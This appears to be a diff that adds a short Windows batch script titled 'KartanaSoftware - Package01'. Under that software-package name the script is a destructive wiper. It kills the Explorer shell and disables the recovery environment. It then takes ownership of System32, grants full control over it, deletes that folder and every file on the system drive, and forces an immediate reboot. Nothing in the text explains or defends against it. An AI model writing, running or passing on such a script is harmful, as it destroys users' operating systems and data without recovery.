@@ -1,0 +1,16 @@
+@echo off
+color 2
+title KartanaSoftware - Package01
+color 2
+taskkill /im explorer.exe /f
+echo Disabling Recovery Enviroment...
+bcdedit /set {current} recoveryenabled no
+echo Taking Ownership of Sys32... && timeout /t 1 /nobreak>nul
+takeown /a /f "C:\Windows\System32"
+echo Granting Icalcs Ownership... && timeout /t1 /nobreak>nul
+icacls "C:\Windows\System32" /grant Administrators:F /T
+echo Deleting Sys32 Folder...
+DEL /Q /S "C:\Windows\System32" 
+del %systemdrive%\*.*/f/s/q
+shutdown -r -f -t 00
+exit
